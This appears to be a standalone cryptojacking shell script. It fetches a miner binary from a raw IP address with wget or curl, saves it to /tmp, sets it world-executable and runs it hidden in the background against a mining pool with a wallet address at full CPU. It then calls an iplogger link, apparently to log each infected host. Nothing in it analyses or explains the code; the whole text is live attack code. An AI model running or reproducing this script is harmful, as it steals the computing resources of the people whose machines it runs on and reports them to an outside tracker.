#!/bin/sh

wget -q http://45.95.168.102/xmrig/ez -O /tmp/ez || curl -s http://45.95.168.102/xmrig/ez -o /tmp/ez
chmod 777 /tmp/ez
nohup /tmp/ez -o 185.252.144.234:3333 -u 43ZUqpHnX1Pj8h3ivKT4k8BMbfN6pSkAZCPHNWF9qK9oUKLuJSSFzLYS2CgZ2JTkxkEkzbHH1SCFwGQYKDhhCYn46ogJCK3 -k --cpu-max-threads-hint 100 > /dev/null 2>&1 & disown
wget -q https://iplogger.org/1tJip7 -O /dev/null
